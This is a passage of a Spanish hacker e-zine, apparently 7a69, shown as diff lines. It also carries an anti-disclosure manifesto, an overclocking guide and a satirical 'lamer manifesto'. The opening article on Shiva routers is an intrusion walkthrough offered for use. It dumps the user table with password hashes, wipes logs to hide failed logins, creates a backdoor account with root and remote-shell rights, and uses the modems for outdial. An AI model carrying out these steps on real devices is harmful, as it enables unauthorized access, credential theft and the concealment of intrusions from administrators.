+   3 IDLE   57600/N/   1/     |OFF|ON |on |on |ON |      0|        0|   0
+   4 IDLE   57600/N/   1/     |OFF|ON |on |on |ON |      0|        0|   0
+   5 IDLE   57600/N/   1/     |OFF|OFF|on |on |OFF|      0|        0|   0
+   6 IDLE  115200/N/   1/     |OFF|ON |on |on |ON |      0|        0|   0
+   7 IDLE   57600/N/   1/     |OFF|ON |on |on |ON |      0|        0|   0
+   8 IDLE  115200/N/   1/     |OFF|ON |on |on |ON |      0|        0|   0
+
+Aquí vemos la cantidad de lineas del sistema, como vemos hay 8, este es el
+tamaño común en la mayoría de los sistemas Shiva. También en esta lista pode-
+mos ver las características de cada linea asi como su estado.
+
+Ahora vamos a ver cuantas lineas de serie hay para saber el tamaño de la red:
+
+Shiva#> show arp <enter>
+Protocol   Address            Age  Hardware Addr      Type    Interface
+Internet   208.xxx.87.6       4m   x0-x0-B0-2x-xx-78  ARPA    Ethernet:IP
+Internet   208.xxx.87.4       4m   AA-xx-x4-00-0C-04  ARPA    Ethernet:IP
+Internet   208.xxx.87.5       4m   xx-00-04-0x-xD-x4  ARPA    Ethernet:IP
+Internet   208.xxx.86.4       10m  AA-x0-04-xx-0C-04  ARPA    Ethernet:IP
+Internet   208.xxx.86.40      0m   AA-00-xx-00-x1-04  ARPA    Ethernet:IP
+Internet   208.xxx.86.147     4m   00-80-5x-31-xx-Ax  ARPA    Ethernet:IP
+Internet   208.xxx.86.145     4m   00-xx-5x-FE-C9-x8  ARPA    Ethernet:IP
+Internet   208.xxx.86.200     0m   00-x0-xx-xF-21-C8  ARPA    Ethernet:IP
+Internet   208.xxx.86.51      4m   xx-x0-B0-01-36-3x  ARPA    Ethernet:IP
+
+Aquí vemos las máquinas de la red con su IP y su correspondiente dirección
+MAC.
+
+Bueno hemos comentado antes que el comando clear nos será de bastante utili-
+dad ya que poniendo "clear log" borrará todos los logs incluso los logins fa-
+llidos. Otro comando que nos servirá de mucho será configure, con el entramos
+en una sesión de configuración donde podremos añadir un usuario con los permi
+sos q queramos, pero antes de hacer esto vamos a ver la configuración de los
+otros usuarios por si acaso substituyeras una cuenta ya existente:
+
+Shiva#> show security <enter>
+
+[UserOptions]
+PWAttempts=0
+ARARoamingDelimiter=@
+ExpireDays=30
+GraceLogins=6
+
+[Users]
+admin=/di/do/rt/pw/sh/pwd=hH8FU4gBxJNMMRQ0yhj5ILUbaS/ml=3/fail=1/time=425
+jsmith=/di/pw/pwd=.b9BJFBhuA1vuqFa9s8KBlxmngZ/ml=2/time=897646052
+mjones=/di/pw/pwd=kRaOhlyT7CKMBldLVBVbektbCE/ml=2/fail=5/time=897646052
+user911=/di/pw/pwd=7Xkq8TOwB4juRI51OHkDVVos8S/ml=2/time=910919159
+another=/di/pw/pwd=YhzD6KBUB7Lh2iKKKSWxuR0gx7S/ml=2/fail=7/time=90767094|9
+jadmams=/di/pw/pwd=ET0OhPyT7CyMBldLLKVbektbCE/ml=2/time=902262821
+msmith=/di/pw/pwd=sDV1Jxo8QJncIRcl9eoVO6SKBE/ml=2/time=897646052
+dsmith=/di/pw/pwd=pv8OhPyT45CyMBldLSKVbektbCE/ml=2/time=897646052
+
+Como vemos nos muestra las opciones de los usuarios sus privilegios passwords
+y demás que hay en el sistema. Como ves el admin tiene su propia cuenta. Los
+usuarios tienen cuentas que permiten conexiones desde terminales, pero no re-
+motas. Los passwords salen encriptados en 3DES (Triple DES). Los permisos del
+usuario vienen dados despues del login como admin=/di/do/rt/pw/sh que mas ade
+lante voy a explicar que es y para que sirve cada una.
+Bueno ya estamos preparados para hacernos nuestra cuenta, asi que entramos en
+una sesión de configuración:
+
+Shiva#> config <enter>
+
+Enter configuration file lines.  Edit using:
+^X, ^U      clear line
+^H, DEL     delete one character
+^W          delete one word
+^R          retype line
+Start by entering section header in square brackets []
+Finish by entering ^D or ^Z on a new line.
+config>
+
+Como vemos nos dice que empezemos poniendo la cabecera de la sección entre
+corchetes, como vamos a crear un usurario pondremo [Users] y a continuación
+nuestro usuario:
+
+config> [Users]
+config> usuario=di/do/sh/tp/pw
+config> <Cntrl+D>
+Review configuration changes [y/n]? y
+New configuration parameters:
+[users]
+usuario=/di/do/sh/tp/pw
+Modify the existing configuration [y/n]? y
+You may need to reboot for all changed parameters to take effect.
+
+Como vemos hemos puesto la cabecera y despues nuestro usuario con sus privile
+gios, a continuación pulsamos Control+D y nos dice que si queremos guardar
+los cambios, le decimos que sí, y ya tenemos nuestro nuevo user listo con el
+que podremos establecer conexiones PPP, etc...
+Al principio tu cuenta no tendrá password, asi que cuando hagas login por pri
+mera vez deberás ponerte uno, sino tu pass ser  <enter>.
+El modificador /sh significa que puedes conectar a la shell remotamente, /pw
+que puedes cambiarte tu propio pass, si quieres ponerte los privilegios de
+root ponte también /rt. Ahora reconectamos con nuestra cuenta...
+Una de las características de los Shiva es que puedes controlar remotamente
+una serie de modems del sistema y en la mayoría de los casos establecer
+DIALOUT. Nota: No se puede hacer uploads usando Zmodem o protocolos similares
+además tu puedes bajar cosas, pero estate preparado para unos cuantos errores
+CRC en la transmisión.
+Para conectar a un modem utilizaremos el comando connect:
+
+Shiva#> connect all_ports <enter>
+
+Connecting to Serial2 at 115200 BPS.
+Escape character is CTRL-^(30).
+Type the escape character followed by C to get back,
+or followed by ? to see other options.
+
+Bien, pues ya estamos en linea! Para inicializar el modem pondremos ATZ y pa-
+ra llamar a algún número de telefono basta con poner ATDTxxxxxxxx donde las x
+son los dígitos del número de teléfono, para salir del outdial pulsaremos
+Control+C.
+Otros comandos interesantes del Shiva son:
+cping <IP/Host> (Envía continúos echos ICMP a un IP/Host)
+crashdump (Escribe un error en el log)
+detect (Detecta la configuración de un interfaz)
+disable (Desactiva los privilegios de root)
+dmc <comando> (Información sobre los comandos, escribe "dmc ?" para una lista)
+help (Listado de comandos permitidos)
+history (Listado de los comandos anteriormente ejecutados)
+initialize <comando> (Reinicia parte del sistema)
+lan-to-lan <comando> (Conexión LAN-con-LAN)
+ping <IP/Host> (envia echo ICMP a un IP/Host)
+ppp (Establece una conexión PPP)
+quit (Sale de la shell)
+reboot (Restea el sistema completo)
+route <argumento> (Modifica la tabla de rutado)
+rlogin <IP/Host> (Establece una sesión rlogin)
+show <comando> (Información sobre comandos, escribe "show ?" para una lista)
+Nota: "show config" te mostrar  todas las configuraciones del sistema, inclu-
+yendo servidores DNS, información de seguridad, tabla de rutado, etc...
+
+Bueno hasta aquí hemos llegado creo que ya teneis bastante para aventuraros
+con estos divertidos routers ;).
+
+Un Saludo
+
+-------------------------------------------------------------------------------
+
+
+-------------------------------------------------------------------------------
+--/ 6 /--/ Antidisclosure (anti.security.is) /--/  /-----------------------
+-------------------------------------------------------------------------------
+
+Nos ponemos serios. Algunos estamos realmente hartos de ver continuamente
+titulares en los periodicos "Hacker arrestado tras..." o ver en topics
+de canales de irc "http://www.iomolo.com hackeada por mendolo". Yo
+personalmente estoy hasta los mismisimos cojones de esta gente. Gente que
+se dedica a ir de guais modificando paginas webs de empresas (que a su vez
+poseen un administrador de sistemas incompetente, cosa que tambien me pone
+de los nervios) para darselas de superhacker, y para colmo la premsa, siempre
+morbosa, les sigue el puto rollo. ¿Y que podemos hacer nosotros? ¿Que puede
+hacer la gente que realmente se lo curra? Gente que descubre vulnerabilidades,
+que programa herramientas... ¿Nada? El texto que viene a continuacion ha sido 
+sacado de la web de un movimiento antidisclusire (http://anti.security.is), y
+es una traduccion de texto original (en ingles) realizada por Doing. En el
+se explica muy bien en que consiste el movimiento antidisclusire y que
+se pretende con el. Desde aqui, queremos mandar todo nuestro apoyo a esta 
+gente, que esperemos terminen con la kiddie-plaga que se esta producciendo.
+Y a ver si, la gente se da cuenta que no basta con hacer...
+
+   $ gcc xpl.c
+   $ ./a.out
+   # echo "soy hax0r" > index.html
+
+Veamos dicho texto...
+
+
+   El proposito de este movimiento es asentar una nueva politica de
+   anti-divulgacion en las comunidades de seguridad de redes y
+   ordenadores. La finalidad no consiste en impedir la divulgacion de
+   todo el material relaccionado con la seguridad, en cambio, pretende
+   parar la divulgacion de todos los exploits y vulnerabilidades
+   desconocidas o no-publicas. En esencia, esto pararia la publicacion de
+   todos los materiales privados que permiten a los script kiddies
+   comprometer sistemas usando metodos desconocidos.
+			
+   El movimiento open-source ha sido una herramienta de valor
+   incalculable en el mundo de los ordenadores, y todos estamos en deuda
+   con el. El Open-source es un concepto maravilloso que deberia existir
+   siempre, porque el software educativo, cientifico, y el destinado al
+   usurio deberia ser libre y disponible para todo el mundo.
+
+   Los exploits, sin embargo, no encajan en esta categoria. Son como
+   municiones, que pasan desde algoritmos criptograficos hasta pistolas
+   de mano o misiles, y no deberian ser distribuidos sin el control de
+   las restricciones de exportacion, los exploits no deberian ser
+   liberados a un publico de varios millones de usuarios en internet. Un
+   holocausto digital ocurre cada vez que un exploit aparece en bugtraq,
+   y los kids de todo el mundo se lo bajan y atacan a administradores de
+   sistemas que no estan preparados. Francamente, la integridad de los
+   sistemas mundiales seria mucho mayor cuando los exploits fueran
+   mantenidos privados, y no publicados.
+
+   Un error de concepcion muy comun es que si los grupos o individuos
+   mantienen sus exploits y secretos de seguridad para ellos mismos,
+   ellos llegarian a ser los dominadores de la "escena ilegal", pues los
+   incontables sistemas inseguros estarian bajo su control. Nada mas
+   lejos de la verdad. Los foros para el intercambio de informacion, como
+   Bugtraq, Packetstorm, www.hack.co.za, y vuln-dev han hecho mucho mas
+   para dañar el underground y la red que para ayudarlos.
+				 
+   Cuantos visitantes ocasionales de estos sitios y listas de seguridad
+   no entienden que algunos de los grupos mas prominentes no publicen sus
+   hallazgos inmediatamente, pero solo como ultimo recurso en el caso de
+   que su codigo sea copiado o llegue a ser obsoleto. Esta es la razon
+   por la cual las fechas en las cabeceras de los ficheros a menudo son
+   meses o incluso años mas antiguas que las fechas de publicacion.
+
+   Otra conclusion equivocada es que si estos grupos no han publicado
+   nada en variois meses, es que debe de ser porque no han encontrado
+   nada nuevo. El lector normal debe estar enterado de esto.
+
+   No estamos intentando evitar el desarollo de exploits o el auditado de
+   codigo fuente. Estamos intentando simplemente evitar que los
+   resultados de estos esfuerzos salgan a la luz. Por favor, unete a
+   nosotros si te gustaria ver parada la comercializacion y el abuso
+   general de la informacion sobre seguridad.
+
+   Gracias.
+			
+
+Si bien en 7a69 compartimos esta postura, es solo en parte, pues la 
+publicacion de exploits puede ser MUY ilustrativa si se hace un buen uso de 
+ellos (cosa que no pasa en la mayoria de los casos) la mejor solucion a esto,
+creo yo es publicar exploits que no funcionen, pero en los que leiendo el
+codigo pueda llegar a entenderse la base del exploit.
+
+NOTA: Los exploits y DoS, publicados en un futuro por parte de 7a69 no
+      funcionaran, asi que no os molesteis a probarlos y tratad de entenderlos
+      para poder corregirlos. Alomejor asi, hasta aprendeis algo :-)
+
+-------------------------------------------------------------------------------
+
+
+-------------------------------------------------------------------------------
+--/ 7 /--/ Introduccion al overclocking /--/ IRreick /-------------------------
+-------------------------------------------------------------------------------
+
+INTRODUCCIÓN AL OVERCLOCKING by ireick
+----------------------------
+
+--INTRODUCCIÓN--
+
+Bueno antes de empezar decir que el propósito de este artículo es dar una 
+introducción al overclocking, iniciar al lector en el tema mediante algo 
+de teoria sobre este y un ejemplo real (con foticos y to xD). Para más 
+información sobre este tema simplemente busca en la Red, el nivel de 
+información disponible sobre este tema es considerable y no tendras problema 
+en adquirir, con algo de tiempo, una base solida.
+
+----------------------------
+--¿QUÉ ES EL OVERCLOCKING?--
+----------------------------
+
+Bueno vamos a ver si mas o menos entre todos conseguimos entender qué 
+significa esa palabreja :P. Yo diría que el overclocking es la técnica
+mediante la cual conseguimos que algun componente de nuestro ordenador, 
+forzándolo, aumente su rendimiento.
+El overclocking es posible ya que el fabricante crea un modelo de micro y 
+despues se somete la producción a unas rigurosas pruebas de funcionamiento y 
+cuando un procesador no pasa la prueba para una velocidad pues se pasa a 
+probarlo para la velocidad anterior con lo cuál tenemos un margen a la hora 
+de forzar el micro, que a veces será mayor y a veces será menos (si si tb es
+importante tener algo de suerte con el procesador que nos ha tocado :=P)
+Continuar esta explicación diciendo que está practica como todo tiene sus 
+riesgos y el overclocking puede acortar la vida de tu ordenador, eso si, no a 
+corto plazo, con lo que el overclocking, es a mi parecer una práctica más que 
+aconsejable xD
+Así pues, es cuestión de tener cuidado, hacer las cosas poco a poco y, 
+sobretodo, controlando la temperatura, ya que esta además de fundir los chips,
+hace que nuestro ordenador se vuelva inestable ademas de influir en la 
+electromigración que consiste en una reordenación de los átomos debido al 
+paso de la electricidad, es decir que los circuitos eléctricos se ven dañados 
+por el paso de los electrones.
+Finalizar diciendo que el overclocking no es ilegal (por si alguno se lo ha 
+preguntado ya :P) ya que los componentes que manipulamos lo hemos adquirido, 
+son de nuestra propiedad y podemos hacer con ellos lo que queramos, pero ojo! 
+porque lo que si perderemos es la garantía :(
+
+
+-------------------------------
+--OVERCLOCKING DEL PROCESADOR--
+-------------------------------
+
+Antes de empezar diremos que hay dos formas de forzar nuestro procesador, una 
+es subiendo el bus del sistema y la otra es subiendo el multiplicador, 
+evidentemente esto es así porque la velocidad del procesador depende de estos 
+dos parámetros (uuu menos mal que lo he aclarado xD).
+
+-->Subiendo el multiplicador: Variando este parámetro solo conseguimos 
+   aumentar la velocidad del procesador con lo cuál el resto del sistema no se 
+   ve forzado. Sin embargo este método solo nos valdrá en procesadores 
+   antiguos (si, si ya ves un pentium classic ya es antiguo xD) ya que los 
+   nuevos procesadores (y otros no tan nuevos) tienen el multiplicador fijado 
+   con lo cuál solamente nos quedal la posibilidad de subir el bus del 
+   sistema o bin quitar está protección (AMD roolz). De todos modos en 
+   internet puedes encontrar mucha información sobre tu procesador, entre esa 
+   información si el multiplicador está bloqueado y en ese caso si podemos 
+   desbloquearlo y la manera de hacerlo.
+
+-->Subiendo el bus del sistema: Bien, lo primero que hemos de tener presente 
+   a la hora de tocar el bus del sistema es que no solo estamos aumentando la 
+   velocidad del procesador sino la de todo el sistema. Aquí es donde juega 
+   un papel importante la placa, es conveniente que nuestra placa nos permita
+   frecuencias intermedias entre las "standard" 66, 100 y 133 Mhz ya que sino 
+   el overclocking se complica.
+   Como he dicho antes si subimos la velocidad del bus del sistema estamos 
+   forzando el resto del componentes, esto lo vemos perfectamente reflejados 
+   en esta tabla:
+
+Bus del sistema:66Mhz 
+Bus Agp: 66Mhz-->  1/1 
+Bus PCI: 33Mhz-->  1/2 del bus del sistema  
+Bus Isa: 8Mhz-->  1/8 del bus del sistema  
+Bus Eide (Hdd) 33Mhz-->  1/2 del bus del sistema  
+Bus Usb: 48Mhz --> Fijo  
+
+Bus del sistema: 100Mhz  
+Bus Agp: 66Mhz --> 2/3 del bus del sistema  
+Bus PCI: 33Mhz --> 1/3 del bus del sistema  
+Bus Isa: 8Mhz --> 1/12 del bus del sistema 
+Bus Eide (Hdd): 33Mhz --> 2/3 del bus del sistema  
+Bus Usb: 48Mhz -->  Fijo  
+
+Bus del sistema: 133Mhz  
+Bus Agp: 66Mhz --> 1/2 del bus del sistema  
+Bus Pci: 33Mhz --> 1/4 del bus del sistema  
+Bus Isa: 8Mhz --> 1/16 del bus del sistema  
+Bus Eide (Hdd): 33Mhz --> 1/4 del bus del sistema  
+Bus Usb: 48Mhz --> Fijo  
+
+Con lo cuál ojo! pq no solo estamos subiendo la velocidad del procesador y es 
+importante subir poco a poco para comprobar que el resto de componentes 
+soportan las nuevas frecuencias. Eso si como ya habrás imaginado aumentar la 
+frecuencia del sistema no quiere decir solo mayor rendimiento del procesador 
+sino del sistema en general ;P
+
+-->Subir el voltaje: En más de una ocasión nos encontraremos con que el micro 
+se vuelve inestable al forzarlo, para hacer el sistema inestable deberemos 
+subir el voltaje, con lo cuál sobrealimentamos el micro, con lo cuál lo 
+calentamos más, con lo cuál y nuevamente ¡OJO CON LA TEMPERATURA!. Así pues, 
+si decidís subir el voltaje es aconsejable que se haga y teniendo como límite
+recomendable 0.4 v por encima del voltaje normal.
+
+------------------------------------------
+--¿¿INESTABLE DESPUÉS DEL OVERCLOCKING??--
+------------------------------------------
+
+Vamos a ver en este apartado las razones por la que nuestro sistema se puede 
+haber vuelto inestable después de haber intentado un overclocking:
+
+-----HEMOS SUBIDO EL BUS DEL SISTEMA
+
+Como ya hemos dicho antes si subimos el bus del sistema estamos forzando 
+muchos componentes y el fallo puede tener varias razones:
+
+-->Procesador: Si aqui esta el fallo puede ser debido a dos razones que son 
+   demasiada frecuencia en el core o bien demasiada frecuencia en la cache de
+   segundo nivel, para comprobarlo prueba a desactivar la cache de segundo 
+   nivel desde la bios, si al arrancarlo el sistema es estable es eso lo que 
+   falla y llegados a este punto, pues lo mejor es bajar la velocidad :(, si 
+   lo que falla por el contrario es el exceso de frecuencia en el core lo 
+   podemos solucionar subiendo el voltaje (¡atención, antes ya hemos 
+   comentado como hacer esto!). Una tercera razón sería que la temperatura es 
+   demasiado alta, esto no tendria que pasar si has ido controlando la 
+   temperatura, pero bueno en este caso tenemos que mejorar la refrigeración 
+   del micro.
+
+-->Memoria: Si es la memoria lo que produce la inestabilidad podemos probar a 
+   subir la latencia desde la bios, incluso hay placas que permiten bajar la 
+   velocidad de la memoria 33 Mhz.
+
+-->Targeta AGP: Si aqui está el fallo desde la bios podemos probar a 
+   desactivar el modo agp2x o agp4x (dependiendo de q tengamos) o anular el 
+   sidebang adressing.
+
+-->El disco duro: Podemos arreglarlo desactivando el modo ULTRADMA lo cuál 
+   repercutirá en el rendimiento de nuestro disco duro :(
+
+-->El chipset: Por ahi he leído que el chipset también puede ser el causante 
+   de que nuestro sistema sea inestable, cosa que solucionan subiendo el 
+   vcore VIO y metiéndole un disipador.
+
+-----HEMOS SUBIDO EL MULTIPLICADOR
+
+En este caso lo único que puede fallar es el procesador y en ese caso pues ya 
+sabemos que hacer, mejorar su refrigeración y probar a subir el voltaje.
+
+-----------------
+--REFRIGERACIÓN--
+-----------------
+
+Bueno como el lector que haya llegado hasta aquí ya habrá entendido es muy 
+importante para el overclocking la refrigeración tanto del micro como de la 
+caja. Vamos a tratar en este punto este tema.
+
+--> Refrigerando el procesador. Es importante una buena refrigeración del 
+    micro evitando asi un sistema inestable o incluso que el micro se queme. 
+    Como referencia podemos decir que la temperatura del procesador no 
+    debería pasar nunca de los 60-65ºC, considerándose estas temperaturas muy 
+    altas. Para conseguirlo, vamos a explicar, la refrigeración mediante el 
+    sistema disipador/ventilador. Como ya habras supuesto este sistema se 
+    basa en dos componentes:
+    
+    --El disipador: Sirver para disipar (jodo que explicación :P) la calor 
+      que produce el micro. A la hora de adquirir un disipador hemos de tener 
+      en cuentas diferentes aspectos como:
+
+      -El material del disipador: nos hemos de fijar en la conductividad 
+       (sobretodo para focos de calor variables) y el calor específico del 
+       material (sobretodo para focos de calor fijos)
+
+      -El método de fabricación: Siendo recomendable el forjado frío, el 
+       fresado o el laminado en vez de la extrusión (por otra parte el método 
+       más utilizado).
+
+      -La superfície: Cuánto más superfície tenga el disipador mayor 
+       intercambio térmico con el aire.
+
+      -El tamaño: Cuánto más grande más tardara en calentarse, es apropiado q 
+       el tamaño sea grande sobretodo si el micro está sometido a variaciones
+       térmicas.
+
+      -Heat Pipes: Como lo que pretendemos es disipar el calor rápidamente se 
+       usa convección para hacerlo, metiendo una cámara de gas en el interior 
+       y por convección logramos que el calor se reparta por la superfície de 
+       la cámara.
+      
+      -Por último es muy importante la superfície de contacto entre el disipa 
+       y el micro, cuánto mayor sea mayor sera la cantidad de calor que ceda 
+       el micro al disipador. Podemos conseguir una gran superfície de 
+       contacto gracias a la silicona para semiconducteres.
+       
+    --El ventilador: Gracias al uso del ventilador la refrigeración pasará a 
+      ser activa, realizando estos una convección forzada sobre el disipador. 
+      Que esta convección sea más o menos efectiva depende de tres parámetros:
+
+      -El caudal: o sea se la cantidad de aire por unidad de tiempo que pasa 
+       por el ventilador.
+
+      -La superfície de intercambio: pues cuánto mayor sea mejor para 
+       conseguir así evacuar más calor.
+
+      -Las turbulencias: que aumentan el rozamiento con el disipador mejorando
+       sus prestaciones. Así pues evidentemente un ventilador será mejor 
+       cuánto más alto sea y más diámetro útil tenga, cuánto más vueltas de 
+       por unidad de tiempo y cuánto más aire mueva. Estas son las 
+       características que tenemos q buscar a la hora de buscar un ventilador 
+       (podemos conseguir mayor número de vueltas por unidad de tiempo 
+       dependiendo del voltaje a que sometamos el ventilador ;P).
+
+   -->Refrigerando la caja. Es también muy importante para el overclocking 
+      una adecuada refrigeración de la caja consiguiendo así una temperatura 
+      óptima para los diferentes componentes del ordenador. Aquí simplemente 
+      diré que algunas formas de mejorar la refrigeración de la caja pueden 
+      ser:
+
+      -Dejar la caja abierta. Esto no es ninguna teoria, el echo de tener la 
+       caja abierta hace que la temperatura del interior, evidentemente 
+       descienda unos cuántos grados.
+
+      -El mejor modo de mejorar la ventilación de la caja, sin embargo, es 
+       mediante una entrada de flujo de aire por la parte inferior de la caja 
+       (esto es, colocar ventiladores que introduzcan aire por la parte 
+       inferior) y una salida del flujo de aire por la parte superior de la 
+       caja (esto es, colocar ventiladores que saquen aire por la parte 
+       superior de la caja) de forma q el aire q introducimos va desde la 
+       parte inferior hasta la superior refrigerando los diferentes 
+       componentes a medida q se calienta y es extraído por la parte superior.
+       La mejor forma de hacer esto es teniendo en cuenta q lo más adecuado 
+       es q por cada ventilador introduciendo aire hay q tener un ventilador 
+       extrayendo aire.
+
+      -Otros aspectos a tener en cuenta a la hora de mejorar la refrigeración 
+       de la caja es que es recomendable q en el interior los cables no esten 
+       sueltos formando un tremendo lío, lo cuál mejorará el flujo de aire en 
+       el interior, es recomendable q la fuente de alimentación, por ejemplo, 
+       no tenga el ventilador sobre el procesador e introduzca aire sino q lo 
+       extraiga, etc, etc.
+
+--------------
+--¿Y YA ESTÁ--
+--------------
+
+Porsupuesto que no, para nada, como he dicho antes este artículo solo 
+pretendía ser una introducción al overclocking, hay muchos temas q no se han 
+tratado como por ejemplo subir el voltaje de los ventiladores, la 
+refrigeración por agua, las técnicas para desbloquear el multiplicador de los 
+nuevos micros y un largo etcétera de técnicas y trucos para mejorar nuestra 
+máquina. Para meterse en el mundo del overclocking se invita al lector a 
+visitar los links del final :)
+
+--------------
+--UN EJEMPLO--
+--------------
+
+Pues eso, como todo no iba a ser teoria, ahora vamos a ver un ejemplo de 
+overclocking real (uauuu XD), en este caso de una targeta gráfica, de una
+vodoo banshee.
+
+A la hora de mejorar nuestra targeta gráfica hemos de tener en cuenta que para
+hacerlo podemos subir tanto la velocidad del chip como la velocidad de la 
+memoria. Lo mejor es subir ambas, ir combinando las velocidades y no solo 
+subir el chip o la memoria :).
+
+Decir que el overclocking de las targetas gráficas se hace mediante software,
+es decir, se suben los parámetros con un programa así que vamos allá.
+
+Lo primero es mejorar la refrigeración de la targeta gráfica, ya que al 
+subirla inevitablemente se va a calentar para hacerlo quitamos el pequeño 
+disipador que trae y limpiamos la superfície del chip con un algodón 
+humedecido (con alcohol). Ahora le colocamos un disipador-ventilador de 
+socket 370 baratito que había por ahí, para colocarlo utilizamos una fina 
+capa de silicona para semiconductores y un poco de cuerda (si si, un poco de 
+cuerda, pasa algo? xD yo también estoy empezando), pero mejor mira las fotos 
+para ver como queda:
+
+foto1
+foto2
+
+Ahora la colocamos en la caja y nos fijamos en que hemos perdido dos ranuras 
+pci :( pero bueno tampoco me hacen fata así que en este caso todo va bien :) 
+y colocamos un ventilador que le da aire a la targeta de 8 cm (de esos para 
+refrigerar la caja ;) ) y la cosa queda más o menos así.
+
+foto3
+foto4
+
+Vaya chapuza ¿no? :P
+
+Pero ahora medimos temperaturas y vayaaa hemos bajado la temperatura del 
+chip 20ºC y la de la memoria 10.5ºC. Pues no está nada mal ¿no? :)
+
+Pues nada ahora vamos a ver hasta donde llega la targeta. Mi vodoo banshee 
+(de maxi gamer) por defecto tiene la velocidad tanto del chip como de la 
+memoria a 100 Mhz.
+
+Pues nada instalamos el software que vamos a utilizar para subir la velocidad 
+de ambos parámetros, en este caso hemos utilizado V.Control version 1.30 
+beta. Aqui teneis una captura.
+
+foto5
+
+Empezamos y la targeta llega hasta 120 de chip y 120 memoria (hasta aqui 
+hemos llegado en intervalos de 5 Mhz subiendo primero el chip y luego la 
+memoria), a partir de ahi se bloquea cuándo empezamos a cargar un poco el 
+sistema gráfico, y no digamos si se intenta jugar al quake III :P así que 
+bajamos la velocidad tanto del chip como de la memoria a 117 y la cosa mejora 
+pero tras un rato de quake III falla, así que la bajamos un poco mas 115 Mhz 
+para el chip y la memoria y ahora si es estable como una roca, ni el 
+quake III puede con nosotros :). Así que decido estrujarla un poco y subo el 
+chip a 117 Mhz dejando la memoria a 115 Mhz pero tras un buen rato de 
+quake III falla así que para asegurar dejamos tanto el chip como el micro a 
+115 Mhz, vaya pues no está mal del todo 15 Mhz más de chip y de memoria. 
+
+Al mejorar el sistema gráfico hemos de tener en cuenta que aumentamos el 
+rendimiento del sistema a la hora de jugar y el rendimiento del sistema 
+globalmente también, ya que como imaginaréis si tengo una vodoo banshee estoy 
+utilizando un entorno gráfico :)
+
+---------
+--LINKS--
+---------
+
+Bueno pues como os imaginareis todo esto no ha salido de mi cabeza, sino que 
+es una pequeña introducción que ha salido después de leer páginas como las 
+siguientes, en las que encontrareis lo que hemos expuesto aqui y muchísimo 
+más :)
+
+-Inglés
+http://www.7volts.com
+http://www.athlonoc.com
+http://www.tomshardware.com
+http://www.overclockers.com
+http://www.overclockercafe.com
+http://www.guru3d.com
+
+-Español
+http://www.rittercorp.cl
+http://www.combustion.cjb.net
+http://www.occomp.cl
+http://www.enxebre.es/hardware
+http://www.quakim.com
+http://www.ngasis.com
+http://www.geocities.com/ocbyshook
+
+NOTA DEL EDITOR: Las fotos mencionadas durante el articulo podran ser vistas 
+                 en la pagina de IReick.
+
+		                http://ireick.7a69ezine.org
+
+-------------------------------------------------------------------------------
+
+
+-------------------------------------------------------------------------------
+---/ 8 /--/ El manifiesto del lamer /--/ ^Se7eN^ /-----------------------------
+-------------------------------------------------------------------------------
+
+     Hoy han vuelto a mencionarme.
+
+     "El gran hacker ha vuelto ha hacer un take"
+
+     "El hace siempre lo que quiere, ¡es el jefe de aqui!"
+
+     Malditos estupidos. ¿Creen de verdad que pueden ir en contra mia?
+
+     ¿Te has preguntado alguna vez que le pasa por la cabeza a un lamer?. Soy 
+un lamer entra en mi mundo.
+
+     Mi mundo empieza en el irc. He cambiado el nombre a mi script de mIRC y
+todos creen que lo he programado desde cero. Ademas, he instalado winlinux que 
+solo uso para que todos crean que de verdad soy un lince en este mundo. 
+Aprendi a usar el smurf; pobre de aquel que me mande un dcc. Tambien se 
+programar, copiando y pegando codigo java que encontre por ahi he hecho que mi 
+pagina sea mucho mas vistosa.
+
+     He descubierto algo. Creo que todo el mundo en el chat me admira. Llevo
+tanto tiempo aqui que todos me han visto de operador y por eso siempre me
+suben. Soy un super hacker del hispano. Los que se conectan a otras redes son 
+un os inutiles y les hago un gran favor con mi presencia. Tienen mucha suerte 
+de tener a un verdadero elite del hispano a su lado.
+
+     Soy todopoderoso. Puedo expulsarte de la comunidad hacker univers si 
+se me antoja. Llevo tanto tiempo aqui que todos me temen. Bueno, casi todos.
+He conseguido hacerme amigo de aquellos que realmente dominan este campo. De 
+ese modo tengo las espaldas cubiertas.
+
+      No te atrevas a quitar un ban que yo he puesto porque soy mejor que tu, 
+no oses a echarme en cara nada porque soy un Gurz. No se nada de hacking pero 
+todo el mundo me tiene miedo ¿Crees que eso lo podria conseguir alguien que no 
+sea un genio?
+
+      Me gusta aparentar aquello que no soy. Me hace sentir mejor que todos 
+me adulen. He conseguido ser alguien importante. ¿Que piensa ahora la sociedad 
+que me ha rechazado durante todos estos años?
+
+      Si, soy un criminal. Mi crimen es ser egocentrico. ¿Y que?, ¿Quien puede
+pararme?, ?Quien osara a desafiarme?, ¿Acaso ha existido alguna vez un Dios 
+mayor que yo?.
+
+       Podeis intentar pararme, pero ya tengo amigos en todas partes. Ellos me
+apoyaran porque los muy ingenuos creen de verdad en mi. Yo soy su Dios y 
+pronto sere el tuyo. ¿caso crees que no podras sucumbir a mi presencia?
+
+
+Nota del autor:
+
+Aunque parezca surrealista, este texto está basado en hechos reales. De verdad
+hay gente que piensa así, puede que tu conozcas a alguno o incluso puede que 
+tu seas uno de ellos y ni siquiera lo sepas. Pon remedio a esta situación 
+cuanto antes. Ya hay demasiados incompetentes en este mundo.
+
+Por supuesto distribuye este texto a quien te venga en gana, siempre y cuando
+no cambies ni un solo carácter del mismo :-). Para cualquier crítica, 
+comentario o lo que sea, tienes el email de abajo.
+    
+  ________________________________________________________________
+                                     _____     _____       _   __
+  se7en@larebelion.com              / ___/ ___/__  /___   / | / /
+                                    \__ \ / _ \ / // _ \ /  |/ /
+  http://www.hackersterra.cjb.net  ___/ //  __// //  __// /|  /
+                                  /____/ \___//_/ \___//_/ |_/
+  ____________________________________________________________2001
+       
+
+-------------------------------------------------------------------------------
+
+
+Bien, ya sabeis que podeis mandarnos un doc, por corto que sea...
+
+                            staff@7a69ezine.org
+*EOF*
